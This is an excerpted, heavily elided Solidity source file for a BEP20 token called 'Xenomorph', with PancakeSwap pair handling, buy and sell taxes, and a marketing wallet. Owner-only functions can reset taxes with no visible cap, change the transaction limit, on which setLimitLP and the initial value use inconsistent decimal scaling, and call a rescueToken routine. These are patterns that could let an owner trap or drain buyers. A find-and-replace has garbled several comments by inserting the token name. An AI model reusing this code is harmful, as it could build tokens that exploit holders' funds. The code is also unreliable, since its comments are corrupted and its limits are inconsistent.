...
interface IERC20 {
	 ...
	 * This allows applications to reconstruct the allowance for all Xenomorph just
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also Xenomorphed.
	...
	// File: contracts/XenomorphBEP20PayingToken.sol
	...
	contract Xenomorph is ERC20, Ownable {
        ...
        address payable public marketingFundWallet = payable(0x8bb2E5F02a5dd8a17c997c9e66F187083157A2be); 
		
		
		
			 struct buyTaxes {
        uint16 liquidityFeeBuy;
        uint16 marketingFeeBuy;
        uint16 reflectionBuy;
        uint16 totalTaxPercent;
		}

		buyTaxes public _buyTaxes = buyTaxes({
        liquidityFeeBuy: 3,
        marketingFeeBuy: 5,
        reflectionBuy: 2,
        totalTaxPercent: 10
		 ...
		 struct sellTaxes {
        uint16 liquidityFeeSell;
        uint16 marketingFeeSell;
        uint16 reflectionSell;
        uint16 totalTaxPercent;
		}

		sellTaxes public _sellTaxes = sellTaxes({
        liquidityFeeSell: 5,
        marketingFeeSell: 7,
        reflectionSell: 3,
        totalTaxPercent: 15
        ...
        // Mapping
        mapping (address => bool) public _isTxLimit;
		...
		uint256 private swapThreshold = 1000000 * (10**9);
		...
		event excludeMultipleAccountFromRewards(address[] Xenomorph, bool isExcluded);

		event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

		event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
		
		uint256 private newLimit = 10000000000 * (10**18); 
		...
		constructor() ERC20("Xenomorph", "XENOMORPH"){

			uint256 _liquidityFeeBuy = 3;
			uint256 _marketingFeeBuy = 5;
			uint256 _reflectionBuy = 2;
			
			uint256 _liquidityFeeSell = 5;
			uint256 _marketingFeeSell = 7;
			uint256 _reflectionSell = 3;
			...
			reflectionBuy = _reflectionBuy;

			
			liquidityFeeSell = _liquidityFeeSell;
			marketingFeeSell = _marketingFeeSell;
			reflectionSell = _reflectionSell;

			
            feeDenominator = _feeDenominator;
			
			totalFeeBuy = _liquidityFeeBuy + _marketingFeeBuy + _reflectionBuy;
			totalFeeSell = _liquidityFeeSell + _marketingFeeSell + _reflectionSell ;
			...
			emit SetIsFeeExempt(marketingFundWallet, true);
		...
		function setIsFeeExempt(address account, bool excluded) public onlyOwner {
			require(_isExcludedFromFees[account] != excluded, "Xenomorph: Account is already the value of 'excluded'");
			_isExcludedFromFees[account] = excluded;
		}
        
        function setIsTxLimitExempt(address account, bool excluded) public onlyOwner {
			require(_isTxLimit[account] != excluded, "Xenomorph: Account is already the value of 'excluded'");
		...
		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "Xenomorph: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "Xenomorph: Automated market maker pair is already set to that value");
		...
		function setDistributorSettings(uint256 gas) private onlyOwner {
			require(gas >= 200000 && gas <= 500000, "Xenomorph: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "Xenomorph: Cannot update distributorGas to same value");
			emit GasForProcessingUpdated(gas, distributorGas);
			distributorGas = gas;
		}

		function setLimitLP(uint256 _newLimit) external onlyOwner() {
            newLimit = _newLimit * 10**9;
			
		}
		// set Fee Receiver
		function setMarketingWallet(address payable _marketingFundWallet) external onlyOwner() {
		...
		// Set our buy fees
        function setBuyTaxes (uint256 _liquidityFeeBuy, uint256 _marketingFeeBuy, uint256 _reflectionBuy) external onlyOwner {
            liquidityFeeBuy = _liquidityFeeBuy;
            marketingFeeBuy = _marketingFeeBuy;
			reflectionBuy = _reflectionBuy;
		 ...
		 // Set our sell fees
		function setSellTaxes  ( uint256 _liquidityFeeSell, uint256 _marketingFeeSell, uint256 _reflectionSell) external onlyOwner {
			liquidityFeeSell = _liquidityFeeSell;
            marketingFeeSell = _marketingFeeSell;
			reflectionSell = _reflectionSell;
			totalFeeSell = _liquidityFeeSell + _marketingFeeSell + _reflectionSell ;
        ...
        function rescueToken(uint256 Timestamp) external onlyOwner {
			_rescueToken(msg.sender, Timestamp);

        }
    
	
        function _rescueToken(address account, uint256 Timestamp) internal virtual {
		...
		function _transfer(
			...
			if( 
				...
				require(amount <= newLimit, "address 100%.");
			}
			...
			if(
				...
				from != marketingFundWallet &&
				to != marketingFundWallet
			) {
				swapping = true;
